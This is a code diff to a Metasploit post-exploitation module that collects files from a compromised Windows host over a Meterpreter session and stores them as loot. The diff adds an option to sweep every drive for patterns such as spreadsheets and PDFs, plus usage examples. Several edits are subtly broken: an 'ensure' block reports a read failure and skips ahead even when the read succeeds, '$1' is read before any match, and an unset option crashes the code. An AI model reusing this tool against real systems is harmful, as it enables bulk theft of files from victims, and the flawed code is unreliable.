@@ -1,3 +1,4 @@
+# -*- coding: UTF-8 -*-
 ##
 # This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -14,6 +15,8 @@ class MetasploitModule < Msf::Post
       'Name'          => 'Windows Gather Generic File Collection',
       'Description'   => %q{
         This module downloads files recursively based on the FILE_GLOBS option.
+        run post/windows/gather/enum_files FILE_GLOBS=*.xls SEARCH_FROM=*
+        run post/windows/gather/enum_files FILE_GLOBS=*.xls;*.pdf SEARCH_FROM=C:/
       },
       'License'       => MSF_LICENSE,
       'Author'        =>
@@ -27,7 +30,7 @@ class MetasploitModule < Msf::Post
 
     register_options(
       [
-        OptString.new('SEARCH_FROM', [ false, 'Search from a specific location. Ex. C:\\']),
+        OptString.new('SEARCH_FROM', [ false, 'Search from a specific location. Ex. C:\\,or *']),
         OptString.new('FILE_GLOBS',  [ true, 'The file pattern to search for in a filename', '*.config'])
       ])
   end
@@ -72,32 +75,22 @@ class MetasploitModule < Msf::Post
     end
 
     getfile.each do |file|
-      filename = "#{file['path']}\\#{file['name']}"
-      data = read_file(filename)
-      print_status("Downloading #{file['path']}\\#{file['name']}")
-      p = store_loot("host.files", 'application/octet-stream', session, data, file['name'], filename)
-      print_good("#{file['name']} saved as: #{p}")
+      # fix : Post failed: EOFError EOFError pool.rb:84:in `read',now next
+      begin
+        filename = "#{file['path']}\\#{file['name']}"
+        data = read_file(filename)
+        print_status("Downloading #{file['path']}\\#{file['name']}")
+        p = store_loot("host.files", 'application/octet-stream', session, data, file['name'], filename)
+        print_good("#{file['name']} saved as: #{p}")
+      ensure
+        print_error("#{filename} is not read")
+        next
+      end
     end
   end
 
-
-  def run
-    # When the location is set, make sure we have a valid path format
-    location = datastore['SEARCH_FROM']
-    if location and location !~ /^([a-z])\:[\\|\/].*/i
-      print_error("Invalid SEARCH_FROM option: #{location}")
-      return
-    end
-
-    # When the location option is set, make sure we have a valid drive letter
-    my_drive = $1
-    drives = get_drives
-    if location and not drives.include?(my_drive)
-      print_error("#{my_drive} drive is not available, please try: #{drives.inspect}")
-      return
-    end
-
-    datastore['FILE_GLOBS'].split(",").each do |glob|
+  def downloadOneDrive(location,my_drive)
+    datastore['FILE_GLOBS'].split(/[:,; \|]/).each do |glob|
       begin
         download_files(location, glob.strip)
       rescue ::Rex::Post::Meterpreter::RequestError => e
@@ -112,6 +105,39 @@ class MetasploitModule < Msf::Post
         end
       end
     end
+  end
+  
+  def run
+    # When the location is set, make sure we have a valid path format
+    drives = get_drives
+
+    # When the location option is set, make sure we have a valid drive letter
+    my_drive = $1
+
+    location = datastore['SEARCH_FROM']
+    if not my_drive
+      #fix f drive is not available, please try: ["C", "D", "E", "F"]
+      my_drive = location[0].upcase
+    end
+    my_drive = my_drive.upcase
+    if '*' == location or '' == location
+      drives.each do |i|
+        location = i + ":/"
+        downloadOneDrive(location,my_drive)
+      end
+      return
+    end
+    if location and location !~ /^([a-zA-F])\:[\\|\/].*/i
+      print_error("Invalid SEARCH_FROM option: #{location}")
+      return
+    end
+
+    if location and not drives.include?(my_drive)
+      print_error("#{my_drive} drive is not available, please try: #{drives.inspect}")
+      return
+    end
+    
+    downloadOneDrive(location,my_drive)
 
     print_status("Done!")
   end
